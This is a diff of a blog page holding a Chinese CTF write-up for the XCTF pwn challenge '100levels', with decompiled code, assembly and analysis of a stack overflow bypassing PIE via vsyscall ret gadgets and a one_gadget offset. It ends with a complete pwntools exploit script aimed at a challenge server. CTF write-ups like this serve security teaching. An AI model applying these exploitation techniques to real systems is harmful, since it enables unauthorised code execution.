@@ -145,198 +145,258 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">1000levevls</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-12-01 10:56:21
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/vsyscall/">vsyscall</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <h3 id="检查程序"><a href="#检查程序" class="headerlink" title="检查程序"></a>检查程序</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211201105739975.png"
+                      alt="image-20211201105739975"
+                ></p>
+<p>开启了pie和nx</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  sub_B69();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = sub_B00();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      hint(a1, a2, v4, v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      go(a1, a2, v4, v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1 = <span class="string">&quot;Wrong input&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_D92(a1, a2, v4, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">go</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  v1 = sub_B00();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = v1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + sub_B00();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are being a real man.&quot;</span>);</span><br><span class="line">      v6 = <span class="number">100LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_E43(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward Coward Coward Coward Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_E43</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_E43((a1 - <span class="number">1</span>)) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = rand() % a1;</span><br><span class="line">  v5 = rand() % a1;</span><br><span class="line">  v4 = v5 * v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Level %d\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v6, v5);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v2 = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 == v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>可以看到E43存在栈溢出但是因为开启了PIE保护所以我们也不知道要ret什么玩意</p>
+<h3 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h3><p>现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall</p>
+<p>vsyscall的固定地址是0xffffffffff600000–0xffffffffff601000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用</p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实在上面思路就断了，看了wp发现这道题需要看一看汇编代码，先看hint的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000D06 ; __unwind &#123;</span><br><span class="line">.text:0000000000000D06                 push    rbp</span><br><span class="line">.text:0000000000000D07                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000D0A                 sub     rsp, 110h</span><br><span class="line">.text:0000000000000D11                 mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D18                 mov     [rbp+var_110], rax</span><br><span class="line">.text:0000000000000D1F                 lea     rax, unk_20208C</span><br><span class="line">.text:0000000000000D26                 mov     eax, [rax]</span><br><span class="line">.text:0000000000000D28                 test    eax, eax</span><br><span class="line">.text:0000000000000D2A                 jz      short loc_D57</span><br><span class="line">.text:0000000000000D2C                 mov     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000000D33                 lea     rdx, [rbp+var_110]</span><br><span class="line">.text:0000000000000D3A                 lea     rcx, [rdx+8]</span><br><span class="line">.text:0000000000000D3E                 mov     rdx, rax</span><br><span class="line">.text:0000000000000D41                 lea     rsi, aHintP     ; &quot;Hint: %p\n&quot;</span><br><span class="line">.text:0000000000000D48                 mov     rdi, rcx        ; s</span><br><span class="line">.text:0000000000000D4B                 mov     eax, 0</span><br><span class="line">.text:0000000000000D50                 call    _sprintf</span><br><span class="line">.text:0000000000000D55                 jmp     short loc_D7C</span><br><span class="line">.text:0000000000000D57 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000D57</span><br><span class="line">.text:0000000000000D57 loc_D57:                                ; CODE XREF: hint+24↑j</span><br><span class="line">.text:0000000000000D57                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000000D5E                 add     rax, 8</span><br><span class="line">.text:0000000000000D62                 mov     rsi, 4E204E5750204F4Eh</span><br><span class="line">.text:0000000000000D6C                 mov     [rax], rsi</span><br><span class="line">.text:0000000000000D6F                 mov     dword ptr [rax+8], 5546204Fh</span><br><span class="line">.text:0000000000000D76                 mov     word ptr [rax+0Ch], 4Eh ; &#x27;N&#x27;</span><br><span class="line">.text:0000000000000D7C</span><br><span class="line">.text:0000000000000D7C loc_D7C:                                ; CODE XREF: hint+4F↑j</span><br><span class="line">.text:0000000000000D7C                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000000D83                 add     rax, 8</span><br><span class="line">.text:0000000000000D87                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000000D8A                 call    _puts</span><br><span class="line">.text:0000000000000D8F                 nop</span><br><span class="line">.text:0000000000000D90                 leave</span><br><span class="line">.text:0000000000000D91                 retn</span><br></pre></td></tr></table></figure>
 
-    }
+<p>虽然hint在反汇编里面看起来是先比较unk_20208C这个地址的值，但是看汇编代码可以看到，他是先将system_addr放到[rbp+var_110]的位置</p>
+<p>在go函数里面也有一个很关键的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v1 = sub_B00();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">	v4 = v1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br></pre></td></tr></table></figure>
 
+<p>关键就关键在v4就是rbp+var_110的位置，继续看汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000B94 ; __unwind &#123;</span><br><span class="line">.text:0000000000000B94                 push    rbp</span><br><span class="line">.text:0000000000000B95                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000B98                 sub     rsp, 120h</span><br><span class="line">.text:0000000000000B9F                 lea     rdi, aHowManyLevels ; &quot;How many levels?&quot;</span><br><span class="line">.text:0000000000000BA6                 call    _puts</span><br><span class="line">.text:0000000000000BAB                 call    sub_B00</span><br><span class="line">.text:0000000000000BB0                 mov     [rbp+var_120], rax</span><br><span class="line">.text:0000000000000BB7                 mov     rax, [rbp+var_120]</span><br><span class="line">.text:0000000000000BBE                 test    rax, rax</span><br><span class="line">.text:0000000000000BC1                 jg      short loc_BD1</span><br><span class="line">.text:0000000000000BC3                 lea     rdi, aCoward    ; &quot;Coward&quot;</span><br><span class="line">.text:0000000000000BCA                 call    _puts</span><br><span class="line">.text:0000000000000BCF                 jmp     short loc_BDF</span><br><span class="line">.text:0000000000000BD1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000BD1</span><br><span class="line">.text:0000000000000BD1 loc_BD1:                                ; CODE XREF: go+2D↑j</span><br><span class="line">.text:0000000000000BD1                 mov     rax, [rbp+var_120]</span><br><span class="line">.text:0000000000000BD8                 mov     [rbp+var_110], rax</span><br><span class="line">.text:0000000000000BDF</span><br><span class="line">.text:0000000000000BDF loc_BDF:                                ; CODE XREF: go+3B↑j</span><br><span class="line">.text:0000000000000BDF                 lea     rdi, aAnyMore   ; &quot;Any more?&quot;</span><br><span class="line">.text:0000000000000BE6                 call    _puts</span><br><span class="line">.text:0000000000000BEB                 call    sub_B00</span><br><span class="line">.text:0000000000000BF0                 mov     [rbp+var_120], rax</span><br><span class="line">.text:0000000000000BF7                 mov     rdx, [rbp+var_110]</span><br><span class="line">.text:0000000000000BFE                 mov     rax, [rbp+var_120]</span><br><span class="line">.text:0000000000000C05                 add     rax, rdx</span><br><span class="line">.text:0000000000000C08                 mov     [rbp+var_110], rax</span><br><span class="line">.text:0000000000000C0F                 mov     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000000C16                 test    rax, rax</span><br><span class="line">.text:0000000000000C19                 jg      short loc_C2C</span><br><span class="line">.text:0000000000000C1B                 lea     rdi, aCowardCowardCo ; &quot;Coward Coward Coward Coward Coward&quot;</span><br><span class="line">.text:0000000000000C22                 call    _puts</span><br><span class="line">.text:0000000000000C27                 jmp     locret_D04</span><br></pre></td></tr></table></figure>
 
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
+<p>可以看到如果我们输入的v5&lt;0的话就会跳转到loc_BDF位置这个时候我们的[rbp+var_110]就变成可控的了。</p>
+<h4 id="为什么可以这么利用"><a href="#为什么可以这么利用" class="headerlink" title="为什么可以这么利用"></a>为什么可以这么利用</h4><p>可以看到hint和go都是在main下被调用，所以他们的rbp都是一样的</p>
+<p>接着看栈溢出的函数的汇编代码，主要关注它栈的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E43 ; __unwind &#123;</span><br><span class="line">.text:0000000000000E43                 push    rbp</span><br><span class="line">.text:0000000000000E44                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000E47                 sub     rsp, 40h</span><br><span class="line">.text:0000000000000E4B                 mov     [rbp+var_34], edi</span><br><span class="line">.text:0000000000000E4E                 mov     [rbp+buf], 0</span><br><span class="line">.text:0000000000000E56                 mov     [rbp+var_28], 0</span><br><span class="line">.text:0000000000000E5E                 mov     [rbp+var_20], 0</span><br><span class="line">.text:0000000000000E66                 mov     [rbp+var_18], 0</span><br><span class="line">.text:0000000000000E6E                 cmp     [rbp+var_34], 0</span><br><span class="line">.text:0000000000000E72                 jnz     short loc_E7E</span><br><span class="line">.text:0000000000000E74                 mov     eax, 1</span><br><span class="line">.text:0000000000000E79                 jmp     locret_F45</span><br></pre></td></tr></table></figure>
 
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
+<p>可以看到他就是将rbp换到rsp上然后再减去0x40，那么此时我们栈这块的内存情况就是</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211201112536495.png"
+                      alt="image-20211201112536495"
+                ></p>
+<p>system地址就在rbp下面的第四个位置，在就是我们只要ret三次就可一到system函数</p>
+<p>这就用到了<strong>vsyscall的固定地址是0xffffffffff600000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用</strong></p>
+<p>但是我们就算是ret到了system也没啥用因为我没法控制rdi，题目又给了libc所以很容易想到one_gadget</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211201112817939.png"
+                      alt="image-20211201112817939"
+                ></p>
+<p>又因为我们再上面说的这个存放system的地方因为add指令是可以控制的，所以利用思路就是计算one_gadget与system的差值(即便是开启了PIE，他们之间的差值不变)然后利用add指令把system的地址换到one_gadget</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./100levels&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">51622</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many levels?\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Any more?\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(one_gadget-system_addr), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;\nQuestion: &quot;</span>)</span><br><span class="line">    question = r.recvuntil(<span class="string">b&#x27; = ? Answer:&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    res = <span class="built_in">eval</span>(question)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(res), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)+p64(vsyscall_addr)*<span class="number">3</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27; = ? Answer:&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-        .name {
-          color: var(--default-text-color);
-        }
+        </div>
 
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
+        
 
-      }
-    }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/12/02/format2/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">format2</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
